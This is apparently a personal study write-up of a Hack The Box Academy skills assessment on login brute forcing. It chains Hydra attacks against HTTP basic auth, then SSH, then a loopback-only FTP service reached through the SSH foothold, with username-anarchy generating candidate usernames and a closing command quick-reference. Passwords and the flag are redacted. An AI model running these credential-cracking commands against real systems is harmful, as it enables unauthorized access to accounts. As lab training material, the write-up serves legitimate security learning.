---
tags: [htb, brute-force, hydra, ssh, ftp, basic-auth, username-enumeration, pivoting]
assessment: HTB Login Brute Forcing — Skills Assessment (Parts 1 & 2)
type: academy
created: 2026-11-05
---

# Brute Force Chain: Basic Auth → SSH → Pivot → FTP

> [!summary] Core idea
> Two parts, one continuous chain. Each cracked login doesn't just open a door — it hands you the **material for the next attack**: basic auth gives you a username, SSH gives you a shell, the shell gives you a name and a wordlist, and that name becomes the usernames for the final FTP crack. The theme throughout: **brute forcing is only step one; what you do with the access decides whether you reach the flag.**

---

## Part 1 — Basic Auth

An HTTP service protected by **HTTP Basic Authentication**. Crack it with Hydra's `http-get` module, pairing a short username list against the common-password list.

```bash
hydra -L top-usernames-shortlist.txt \
      -P 2023-200_most_used_passwords.txt \
      -s 39853 -f 154.57.164.66 http-get
```

```
[39853][http-get] host: 154.57.164.66   login: admin   password: <REDACTED>
```

- `-s 39853` sets the non-standard port, `-f` stops at the first valid pair.
- Login: **admin** / `<REDACTED>`.

Authenticating with those credentials reveals the username for Part 2: **`satwossh`**. That's the whole point of Part 1 — the cracked login *is* the input to Part 2.

---

## Part 2 — SSH foothold

### Recon

Confirm the service and version before throwing credentials at it:

```bash
nmap -sV -p 40513 154.57.164.74
```

```
40513/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.10
```

### Crack SSH for the known user

You already have the username (`satwossh`) from Part 1, so brute **one** user against the password list — far faster than spraying users:

```bash
hydra -l satwossh -P 2020-200_most_used_passwords.txt ssh://154.57.164.74:40513
```

```
[40513][ssh] host: 154.57.164.74   login: satwossh   password: <REDACTED>
```

> [!tip] One known user beats a user list
> With a confirmed username, drop `-L` for `-l`. Fewer requests, less lockout risk, and SSH throttles parallel sessions anyway (`-t 4` is friendlier than the default 16).

```bash
ssh satwossh@154.57.164.74 -p 40513
```

---

## Part 2 — Enumerate, then turn a name into usernames

The home directory hands you everything the next step needs:

```bash
satwossh@...:~$ ls
IncidentReport.txt  passwords.txt  username-anarchy
```

The incident report names a person of interest:

```bash
satwossh@...:~$ cat IncidentReport.txt
```

> …The user **Thomas Smith** has been regularly uploading files to the [FTP] server… All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers…

So the FTP account belongs to a human named **Thomas Smith** — but you don't know his *username format*. That's exactly what **username-anarchy** is for: it expands a real name into every common username permutation.

```bash
./username-anarchy/username-anarchy Thomas Smith > thomas_smith_usernames.txt
cat thomas_smith_usernames.txt
```

```
thomas
thomassmith
thomas.smith
t.smith
tsmith
smith
...
```

> [!warning] Pass the name as two arguments
> `username-anarchy Thomas Smith` (first + last, space-separated) generates the full permutation list. Passing `Thomas-Smith` as one hyphenated argument only yields `thomas-smith` — a single useless candidate. Small syntax detail, big difference in coverage.

---

## Part 2 — Crack FTP from inside the box

Key observation: the FTP service answers on **`127.0.0.1`** — it's bound to loopback, not exposed externally. That's why you brute it **from within the SSH session**, not from your attack host. The conveniently-placed `passwords.txt` becomes the password list:

```bash
hydra -L thomas_smith_usernames.txt -P ./passwords.txt -f ftp://127.0.0.1
```

```
[21][ftp] host: 127.0.0.1   login: thomas   password: <REDACTED>
```

The generated-username list paid off: the real account is simply **`thomas`**.

---

## Part 2 — Grab the flag

```bash
satwossh@...:~$ ftp 127.0.0.1
Name (127.0.0.1): thomas
Password: <REDACTED>
230 Login successful.

ftp> ls
-rw-------  1 1001  1001  28 Sep 10  2024 flag.txt
ftp> get flag.txt
ftp> exit

satwossh@...:~$ cat flag.txt
HTB{<REDACTED>}
```

---

## The chain in one line

**Basic-auth crack → username for Part 2 → SSH crack for that user → shell → incident report names "Thomas Smith" → username-anarchy turns the name into candidates → FTP (loopback) crack from inside the box → flag.**

---

## Reusable takeaways

- [ ] **Each credential feeds the next stage** — a cracked login is rarely the goal; it's the input to the following attack.
- [ ] **Known username → single-user brute** (`-l` not `-L`): faster, quieter, fewer lockouts.
- [ ] **Recon before brute** — `nmap -sV` confirms the service/port so you attack the right module.
- [ ] **Loopback-bound services need a pivot** — FTP on `127.0.0.1` is only reachable from inside the host, so you brute it through the SSH foothold.
- [ ] **Turn names into usernames** — `username-anarchy "First Last"` expands a human name from a report into the real-world username formats to spray.
- [ ] **Loot the home directory** — the incident report and the password list you needed were both just sitting there; enumerate before you import tooling.

## Command quick-reference

```bash
# Part 1 — basic auth
hydra -L users.txt -P passwords.txt -s 39853 -f <IP> http-get

# Part 2 — recon + single-user SSH crack
nmap -sV -p 40513 <IP>
hydra -l satwossh -P passwords.txt ssh://<IP>:40513
ssh satwossh@<IP> -p 40513

# Part 2 — name -> usernames -> FTP crack (from inside the box)
./username-anarchy/username-anarchy Thomas Smith > users.txt
hydra -L users.txt -P ./passwords.txt -f ftp://127.0.0.1

# Part 2 — flag
ftp 127.0.0.1    # login as thomas, get flag.txt
```
